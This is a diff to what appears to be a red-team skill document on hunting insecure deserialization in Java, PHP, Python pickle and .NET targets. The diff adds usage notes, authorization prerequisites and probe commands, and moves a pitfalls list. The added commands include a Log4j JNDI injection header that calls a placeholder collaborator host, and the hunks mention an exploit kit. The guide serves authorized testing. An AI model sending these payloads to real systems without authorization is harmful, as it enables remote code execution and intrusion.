@@ -4,11 +4,49 @@ description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), P
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [deserialization, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [deserialization, hunt, redteam]
+  category: redteam
 ---
 
 # HUNT-DESERIALIZATION — Insecure Deserialization
+
+## When to Use
+
+- Target runs Java, PHP serialization, Python pickle, .NET.
+- Ruby on Rails.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`, `interactsh-client`, `phpggc`, `python3`, `ysoserial`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
+# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
+echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05
+
+# PHP serialization: O:8:"stdClass":0:{}
+# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02
+
+# Apache Shiro: rememberMe cookie present
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"
+
+# Log4j: test user-controlled fields for JNDI interpolation
+curl --max-time 30 --connect-timeout 10 -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -169,6 +207,16 @@ git clone https://github.com/pimps/JNDI-Exploit-Kit
 
 **Severity:** Almost always **Critical** — RCE with server process privileges.
 
+## Pitfalls
+
+- **ysoserial payload without gadget chain** — generating a payload is not exploitation. Need to confirm the target's classpath contains the specific gadget.
+- **Java deserialization vs PHP unserialize** — different languages, different tools. Don't cross-apply payloads.
+- **Base64-encoded payload but server expects raw binary** — some servers accept base64, others raw. Test both encodings.
+- **Content-Type mismatch** — Java deserialization typically expects `application/x-java-serialized-object` or `application/octet-stream`. Wrong Content-Type may cause silent rejection.
+- **WAF deserialization filtering** — many WAFs block known ysoserial gadget signatures. The bug may still exist but require a custom gadget chain.
+
+---
+
 ## Verification
 
 1. **ysoserial availability** — check if ysoserial is installed:
@@ -180,17 +228,6 @@ git clone https://github.com/pimps/JNDI-Exploit-Kit
    php -r "echo serialize(['test'=>'value']);" 2>/dev/null && echo "PASS: PHP serialize works" || echo "NOTE: PHP not available"
    ```
 All tests verify deserialization probing.
-
----
-
-## Pitfalls
-
-- **ysoserial payload without gadget chain** — generating a payload is not exploitation. Need to confirm the target's classpath contains the specific gadget.
-- **Java deserialization vs PHP unserialize** — different languages, different tools. Don't cross-apply payloads.
-- **Base64-encoded payload but server expects raw binary** — some servers accept base64, others raw. Test both encodings.
-- **Content-Type mismatch** — Java deserialization typically expects `application/x-java-serialized-object` or `application/octet-stream`. Wrong Content-Type may cause silent rejection.
-- **WAF deserialization filtering** — many WAFs block known ysoserial gadget signatures. The bug may still exist but require a custom gadget chain.
-
 
 ---
 
